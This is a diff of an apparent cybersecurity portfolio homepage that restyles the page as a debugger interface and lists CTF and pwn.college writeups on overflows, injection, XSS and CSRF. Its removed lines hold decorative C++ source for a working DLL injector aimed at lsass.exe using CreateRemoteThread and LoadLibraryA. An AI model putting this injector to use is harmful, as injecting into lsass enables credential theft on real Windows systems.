@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Himanshu | Cybersecurity Portfolio</title>
+    <title>Himanshu Parate // Exploit Developer</title>
     <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
     
     <!-- Open Graph Metadata -->
-    <meta property="og:title" content="Himanshu | Cybersecurity Portfolio" />
+    <meta property="og:title" content="Himanshu Parate // Exploit Developer" />
     <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
     <meta property="og:type" content="website" />
     <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
@@ -15,165 +15,1458 @@
     <link rel="stylesheet" href="/assets/css/style.css">
 </head>
 <body>
-    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
-    <div id="bg-code-layer" aria-hidden="true">
-#include &lt;windows.h&gt;
-#include &lt;iostream&gt;
-#include &lt;tlhelp32.h&gt;
-
-// Internal structures for PEB and API Hooking
-typedef struct _UNICODE_STRING {
-    USHORT Length;
-    USHORT MaximumLength;
-    PWSTR  Buffer;
-} UNICODE_STRING, *PUNICODE_STRING;
-
-DWORD FindProcessId(const std::wstring& processName) {
-    PROCESSENTRY32 processInfo;
-    processInfo.dwSize = sizeof(processInfo);
-
-    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
-
-    Process32First(processesSnapshot, &processInfo);
-    if (!processName.compare(processInfo.szExeFile)) {
-        CloseHandle(processesSnapshot);
-        return processInfo.th32ProcessID;
-    }
-
-    while (Process32Next(processesSnapshot, &processInfo)) {
-        if (!processName.compare(processInfo.szExeFile)) {
-            CloseHandle(processesSnapshot);
-            return processInfo.th32ProcessID;
-        }
-    }
-
-    CloseHandle(processesSnapshot);
-    return 0;
-}
-
-int main() {
-    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
-    DWORD processId = FindProcessId(L"lsass.exe");
-
-    if (!processId) {
-        std::cerr << "[-] Target process not found." << std::endl;
-        return 1;
-    }
-
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
-    if (!hProcess) {
-        std::cerr << "[-] Failed to open process." << std::endl;
-        return 1;
-    }
-
-    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
-    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
-
-    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
-        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
-        pDllPath, 0, 0);
-
-    WaitForSingleObject(hLoadThread, INFINITE);
-    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
-    CloseHandle(hLoadThread);
-    CloseHandle(hProcess);
-
-    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
-    return 0;
-}
+    <!-- Subtle Hexdump Background to mimic RE tool -->
+    <div class="bg-hexdump" aria-hidden="true">
+00000000  7f 45 4c 46 02 01 01 00  00 00 00 00 00 00 00 00  |.ELF............|
+00000010  03 00 3e 00 01 00 00 00  60 10 40 00 00 00 00 00  |..>.....`.@.....|
+00000020  40 00 00 00 00 00 00 00  48 30 00 00 00 00 00 00  |@.......H0......|
+00000030  00 00 00 00 40 00 38 00  09 00 40 00 1a 00 19 00  |....@.8...@.....|
+00000040  06 00 00 00 04 00 00 00  40 00 00 00 00 00 00 00  |........@.......|
+00000050  40 00 40 00 00 00 00 00  40 00 40 00 00 00 00 00  |@.@.....@.@.....|
+00000060  f8 01 00 00 00 00 00 00  f8 01 00 00 00 00 00 00  |................|
+00000070  08 00 00 00 00 00 00 00  03 00 00 00 04 00 00 00  |................|
+00000080  38 02 00 00 00 00 00 00  38 02 40 00 00 00 00 00  |8.......8.@.....|
+00000090  38 02 40 00 00 00 00 00  1c 00 00 00 00 00 00 00  |8.@.............|
+000000a0  1c 00 00 00 00 00 00 00  01 00 00 00 00 00 00 00  |................|
+000000b0  01 00 00 00 05 00 00 00  00 00 00 00 00 00 00 00  |................|
+000000c0  00 00 40 00 00 00 00 00  00 00 40 00 00 00 00 00  |..@.......@.....|
+000000d0  e4 08 00 00 00 00 00 00  e4 08 00 00 00 00 00 00  |................|
+000000e0  00 10 00 00 00 00 00 00  01 00 00 00 06 00 00 00  |................|
+000000f0  e8 0d 00 00 00 00 00 00  e8 0d 60 00 00 00 00 00  |........`.@.....|
+00000100  e8 0d 60 00 00 00 00 00  48 02 00 00 00 00 00 00  |..`.....H.......|
+00000110  50 02 00 00 00 00 00 00  00 10 00 00 00 00 00 00  |P...............|
+00000120  02 00 00 00 06 00 00 00  08 0e 00 00 00 00 00 00  |................|
+00000130  08 0e 60 00 00 00 00 00  08 0e 60 00 00 00 00 00  |..`.......`.....|
+00000140  f0 01 00 00 00 00 00 00  f0 01 00 00 00 00 00 00  |................|
+00000150  08 00 00 00 00 00 00 00  04 00 00 00 04 00 00 00  |................|
+00000160  54 02 00 00 00 00 00 00  54 02 40 00 00 00 00 00  |T.......T.@.....|
+00000170  54 02 40 00 00 00 00 00  44 00 00 00 00 00 00 00  |T.@.....D.......|
+00000180  44 00 00 00 00 00 00 00  04 00 00 00 00 00 00 00  |D...............|
+00000190  51 e5 74 64 06 00 00 00  00 00 00 00 00 00 00 00  |Q.td............|
+000001a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000001b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+000001c0  08 00 00 00 00 00 00 00  52 e5 74 64 04 00 00 00  |........R.td....|
+000001d0  e8 0d 00 00 00 00 00 00  e8 0d 60 00 00 00 00 00  |........`.@.....|
     </div>
 
-    <div class="glow-orb-1"></div>
-    <div class="glow-orb-2"></div>
-
     <header>
-        <div class="container">
-            <a href="/" class="site-title">KAAAMMUUI</a>
+        <div class="page-container">
+            <a href="/" class="site-wordmark">0xKAAAMMUUI</a>
             <nav>
-                <a href="/" class="active">Home</a>
-                <a href="/projects/" >Projects</a>
-                <a href="/game-modding/" >Game Modding</a>
-                <a href="/writeups/" >CTF Writeups</a>
-                <a href="/notes/" >Notes</a>
+                <a href="/" class="active">0x0000 [.text] Home</a>
+                <a href="/writeups/" >0x1000 [.data] Writeups</a>
+                <a href="/game-modding/" >0x2000 [.ro] Game Mods</a>
+                <a href="/notes/" >0x3000 [.bss] Notes</a>
             </nav>
         </div>
     </header>
 
-    <main>
-        <div class="container">
-    <section class="profile-header" style="margin-bottom: 2rem; text-align: center; padding: 6rem 0;">
-        <h1><span class="glitch" data-text="Himanshu &quot;Kaaammuui&quot;">Himanshu "Kaaammuui"</span></h1>
-        <p class="subtitle" style="font-size: 1.25rem; max-width: 600px; margin: 0 auto 2rem;">Focusing on system exploitation, game modding, and low-level vulnerability research. Documenting findings and building custom tooling for modern security challenges.</p>
-        <div class="contact-nodes" style="margin-top: 2rem; display: flex; justify-content: center; gap: 1rem; flex-wrap: wrap;">
-            <a href="https://github.com/HimanshuP601" target="_blank" class="social-btn">GitHub</a>
-            <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank" class="social-btn">LinkedIn</a>
-            <a href="https://pwn.college/hacker/HimanshuP601" target="_blank" class="social-btn" style="border-color: var(--accent-purple); color: var(--text-main);">pwn.college</a>
-            <a href="https://medium.com/@HimanshuP601" target="_blank" class="social-btn">Medium</a>
-            <a href="mailto:himanshuparate601@gmail.com" class="social-btn">Email</a>
-            <span class="social-btn" style="cursor: default;">Discord: himasnhu</span>
+    <div class="page-container">
+        <div class="docked-window" style="margin-bottom: 2rem;">
+    <div class="window-header">
+        <span>pwndbg - [Target: ./himanshu]</span>
+        <span class="tag">x86_64</span>
+    </div>
+    <div class="pwndbg-panel">
+        <div style="color: var(--text-muted); margin-bottom: 1rem;">
+            pwndbg: loaded 125 commands. Type pwndbg [filter] for a list.<br>
+            pwndbg: created $rebase, $ida gdb functions (can be used with print/watch)
         </div>
-    </section>
+        
+        <div class="pwndbg-row" style="margin-bottom: 0.5rem;">
+            <span class="pwndbg-label">LEGEND</span>
+            <span style="color: var(--syn-danger);">STACK</span> |
+            <span style="color: var(--syn-success);">HEAP</span> |
+            <span style="color: var(--syn-address);">CODE</span> |
+            <span style="color: var(--syn-string);">DATA</span> |
+            <span style="color: var(--text-bright);">RWX</span> |
+            <span style="color: var(--text-muted);">RODATA</span>
+        </div>
 
-    <section>
-        <h2>Latest Research & Writeups</h2>
-        <div class="grid">
-            
-            
-            <div class="card">
-                <h3>Synthetic Stacks</h3>
-                <div class="meta" style="font-size: 0.8rem;">Date: May 16, 2026 | TCS Hackquest S10 Round 1</div>
-                <p>Crack a password-protected 7z archive disguised as an MSI and decode a base64 payload to reveal a QR code.</p>
-                <a href="/writeups/tcs-hackquest-s10-r1-synthetic-stacks/" class="view-btn">Read Writeup</a>
-            </div>
-            
-            <div class="card">
-                <h3>StackFall</h3>
-                <div class="meta" style="font-size: 0.8rem;">Date: May 16, 2026 | TCS Hackquest S10 Round 1</div>
-                <p>Exploit a classic buffer overflow vulnerability to overwrite a variable and execute a win() function.</p>
-                <a href="/writeups/tcs-hackquest-s10-r1-stackfall/" class="view-btn">Read Writeup</a>
-            </div>
-            
-            <div class="card">
-                <h3>Seeds of Time</h3>
-                <div class="meta" style="font-size: 0.8rem;">Date: May 16, 2026 | TCS Hackquest S10 Round 1</div>
-                <p>Exploit a predictable PRNG seed (Unix timestamp) to decrypt the flag.</p>
-                <a href="/writeups/tcs-hackquest-s10-r1-seeds-of-time/" class="view-btn">Read Writeup</a>
-            </div>
-            
+        <div style="margin: 1rem 0; border-top: 1px solid var(--border-color); width: 100%;"></div>
+        
+        <div class="pwndbg-row">
+            <span class="pwndbg-label">RAX</span>
+            <span class="pwndbg-addr">0x0</span>
         </div>
-    </section>
+        <div class="pwndbg-row">
+            <span class="pwndbg-label">RBX</span>
+            <span class="pwndbg-addr">0x7fffffffdf38</span>
+            <span class="pwndbg-arrow">-></span>
+            <span class="pwndbg-value">0x7fffffffe308</span>
+            <span class="pwndbg-arrow">-></span>
+            <span class="pwndbg-str">"exploit_dev"</span>
+        </div>
+        <div class="pwndbg-row">
+            <span class="pwndbg-label">RCX</span>
+            <span class="pwndbg-addr">0x7ffff7ec4c5b</span>
+            <span class="pwndbg-arrow">-></span>
+            <span class="pwndbg-instr">&lt;write+27&gt; cmp rax, 0xfffffffffffff000</span>
+        </div>
+        <div class="pwndbg-row">
+            <span class="pwndbg-label">RDI</span>
+            <span class="pwndbg-addr">0x1</span>
+        </div>
+        <div class="pwndbg-row">
+            <span class="pwndbg-label">RSI</span>
+            <span class="pwndbg-addr">0x555555558060</span>
+            <span class="pwndbg-arrow">-></span>
+            <span class="pwndbg-str">"reverse_engineering"</span>
+        </div>
+        <div class="pwndbg-row">
+            <span class="pwndbg-label">RIP</span>
+            <span class="pwndbg-addr">0x555555555129</span>
+            <span class="pwndbg-arrow">-></span>
+            <span class="pwndbg-instr">&lt;main+41&gt; call display_skills</span>
+        </div>
 
-    <section style="margin-top: 4rem;">
-        <h2><span style="color: var(--accent-purple); font-family: var(--font-mono);">[ SYNC ]</span> External Publications</h2>
-        <div id="medium-feed" class="terminal-widget">
-            <p style="color: var(--text-muted); font-family: var(--font-mono);">> initializing connection to medium.com...</p>
+        <div id="pwndbg-output">
+            <pre style="color: var(--syn-danger); font-family: var(--font-mono); font-size: 0.6rem; font-weight: bold; margin-bottom: 1rem; line-height: 1.2;">
+ _  __  _    _    _    __  __ __  __ _   _ _   _ ___ 
+| |/ / / \  / \  / \  |  \/  |  \/  | | | | | | |_ _|
+| ' / / _ \/ _ \/ _ \ | |\/| | |\/| | | | | | | || | 
+| . \/ ___ \ ___ \ ___ \| |  | | |  | | |_| | |_| || | 
+|_|\_\_/   \_\_/   \_\_\|_|  |_|_|  |_|\___/ \___/|___|
+            </pre>
+            <div style="margin-top: 1rem;">
+                <span style="color: var(--syn-danger);">pwndbg></span> info proc bio<br>
+                <span style="color: var(--text-main);">
+                    I break things to understand how they work. <br>
+                    Into memory corruption, binary analysis, and poking at game internals. <br>
+                    This is where I document what I find.
+                </span>
+            </div>
+            <div style="margin-top: 1rem;">
+                <span style="color: var(--syn-danger);">pwndbg></span> info proc socials<br>
+                <span style="color: var(--syn-address);">HackTheBox</span>   : <a href="https://app.hackthebox.com/users/2410266" target="_blank" style="color: var(--syn-string);">https://app.hackthebox.com/users/2410266</a><br>
+                <span style="color: var(--syn-address);">Medium</span>       : <a href="https://medium.com/@HimanshuP601" target="_blank" style="color: var(--syn-string);">https://medium.com/@HimanshuP601</a><br>
+                <span style="color: var(--syn-address);">pwn.college</span>  : <a href="https://pwn.college/hacker/HimanshuP601" target="_blank" style="color: var(--syn-string);">https://pwn.college/hacker/HimanshuP601</a><br>
+                <span style="color: var(--syn-address);">GitHub</span>       : <a href="https://github.com/HimanshuP601" target="_blank" style="color: var(--syn-string);">https://github.com/HimanshuP601</a><br>
+                <span style="color: var(--syn-address);">LinkedIn</span>     : <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank" style="color: var(--syn-string);">https://www.linkedin.com/in/himanshuparate/</a>
+            </div>
         </div>
-    </section>
+        <div class="pwndbg-input-wrapper">
+            <span style="color: var(--syn-danger); font-weight: bold;">pwndbg></span>
+            <input type="text" id="pwndbg-input" class="pwndbg-input" autocomplete="off" spellcheck="false" autofocus>
+        </div>
+    </div>
 </div>
 
-    </main>
+<div class="tool-strip">
+    <span class="tool-badge orange">IDA Pro</span>
+    <span class="tool-badge blue active">GDB / pwndbg</span>
+    <span class="tool-badge purple">Ghidra</span>
+    <span class="tool-badge teal">x64dbg</span>
+    <span class="tool-badge red">Cheat Engine</span>
+    <span class="tool-badge">pwntools</span>
+</div>
+
+<div class="grid-2-col">
+    <div class="docked-window">
+        <div class="window-header">
+            <span>IDA View - Recent Writeups</span>
+            <span class="tag">Functions window</span>
+        </div>
+        <div class="ida-list-wrapper scrollable">
+        <table class="ida-list">
+            <thead>
+                <tr>
+                    <th>Address</th>
+                    <th>Function Name</th>
+                    <th>Segment</th>
+                    <th>Date</th>
+                </tr>
+            </thead>
+            <tbody>
+                
+                
+                <tr>
+                    <td class="ida-addr">0x194305</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-synthetic-stacks/">Synthetic Stacks</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194306</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-stackfall/">StackFall</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194307</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-seeds-of-time/">Seeds of Time</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194308</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-paper-scripts/">Paper Scripts</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194309</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-noise/">Noise</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194310</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-know-me-better/">Know Meh Better</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194311</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-hidden-layers/">Hidden Layers</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194312</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-catch-me-if-you-bot/">Catch Me If You Bot</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194313</td>
+                    <td class="ida-name"><a href="/writeups/tcs-hackquest-s10-r1-address-abyss/">Address Abyss</a></td>
+                    <td class="ida-seg">.ctf</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194314</td>
+                    <td class="ida-name"><a href="/writeups/pwnable-tw-start/">Start</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194315</td>
+                    <td class="ida-name"><a href="/writeups/pwnable-tw-orw/">ORW</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194316</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level06/">Level 06</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194317</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level05/">Level 05</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194318</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level04/">Level 04</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194319</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level03/">Level 03</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194320</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level02/">Level 02</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194321</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level01/">Level 01</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194322</td>
+                    <td class="ida-name"><a href="/writeups/exploit-education-nebula-level00/">Level 00</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/05/16</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194323</td>
+                    <td class="ida-name"><a href="/writeups/web-security-27-csrf5/">CSRF-5 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194324</td>
+                    <td class="ida-name"><a href="/writeups/web-security-26-csrf4/">CSRF-4 Write-up — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194325</td>
+                    <td class="ida-name"><a href="/writeups/web-security-25-csrf3/">CSRF-3 Write-up — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194326</td>
+                    <td class="ida-name"><a href="/writeups/web-security-24-csrf2/">CSRF-2 Write-up — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194327</td>
+                    <td class="ida-name"><a href="/writeups/web-security-23-csrf1/">💉 CSRF 1 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194328</td>
+                    <td class="ida-name"><a href="/writeups/web-security-22-xss7/">XSS-7 Write-up — pwn.college</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194329</td>
+                    <td class="ida-name"><a href="/writeups/web-security-21-xss6/">🛡️ XSS 6 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194330</td>
+                    <td class="ida-name"><a href="/writeups/web-security-20-xss5/">🛡️ XSS 5 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194331</td>
+                    <td class="ida-name"><a href="/writeups/web-security-19-xss4/">🛡️ XSS 4 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194332</td>
+                    <td class="ida-name"><a href="/writeups/web-security-18-xss3/">XSS 3 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194333</td>
+                    <td class="ida-name"><a href="/writeups/web-security-17-xss2/">XSS 2 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194334</td>
+                    <td class="ida-name"><a href="/writeups/web-security-16-xss1/">🛡️ Web — XSS1 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194335</td>
+                    <td class="ida-name"><a href="/writeups/web-security-15-sqli5/">SQL Injection 5 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194336</td>
+                    <td class="ida-name"><a href="/writeups/web-security-14-sqli4/">SQL Injection 4 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194337</td>
+                    <td class="ida-name"><a href="/writeups/web-security-13-sqli3/">SQLi 3 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194338</td>
+                    <td class="ida-name"><a href="/writeups/web-security-12-sqli2/">💉 SQL Injection 2 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194339</td>
+                    <td class="ida-name"><a href="/writeups/web-security-11-sqli1/">💉 SQL Injection 1 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194340</td>
+                    <td class="ida-name"><a href="/writeups/web-security-10-authentication-bypass2/">🔐 Authentication Bypass 2 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194341</td>
+                    <td class="ida-name"><a href="/writeups/web-security-09-authentication-bypass1/">Authentication Bypass 1 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194342</td>
+                    <td class="ida-name"><a href="/writeups/web-security-08-cdmi6/">💉 Command Injection 6 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194343</td>
+                    <td class="ida-name"><a href="/writeups/web-security-07-cdmi5/">💉 Command Injection 5 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194344</td>
+                    <td class="ida-name"><a href="/writeups/web-security-06-cdmi4/">Command Injection 4 — Writeup</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194345</td>
+                    <td class="ida-name"><a href="/writeups/web-security-05-cdmi3/">🧠 Challenge Name: CMDi-3</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194346</td>
+                    <td class="ida-name"><a href="/writeups/web-security-04-dsmi2/">🧠 Challenge Name: CMDi-2</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194347</td>
+                    <td class="ida-name"><a href="/writeups/web-security-03-cdmi1/">Challenge: CDMi 1</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194348</td>
+                    <td class="ida-name"><a href="/writeups/web-security-02-path-traversal-2/">🕵️‍♂️ Challenge: Path Traversal 2</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194349</td>
+                    <td class="ida-name"><a href="/writeups/web-security-01-path-traversal-1/">🕵️‍♂️ Challenge: Path Traversal 1</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194350</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-50-wget/">Challenge Name: wget</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194351</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-49-as/">Challenge Name: as</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194352</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-48-gcc/">Challenge Name: gcc</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194353</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-47-wc/">Challenge Name: wc</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194354</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-45-date/">Challenge Name: date</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194355</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-44-bash/">Challenge Name: bash</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194356</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-43-ruby/">Challenge Name: ruby</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194357</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-42-python/">Challenge Name: python</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194358</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-41-perl/">Challenge Name: perl</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194359</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-40-mv/">Challenge Name: mv</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194360</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-39-cp/">Challenge Name: cp</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194361</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-38-chmod/">Challenge Name: chmod</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194362</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-37-chown/">Challenge Name: chown</a></td>
+                    <td class="ida-seg">.platform</td>
+                    <td class="ida-date">2026/04/27</td>
+                </tr>
+                
+                <tr>
+                    <td class="ida-addr">0x194363</td>
+                    <td class="ida-name"><a href="/writeups/program-misuse-36-ed/">Challenge Name: ed</a></td>
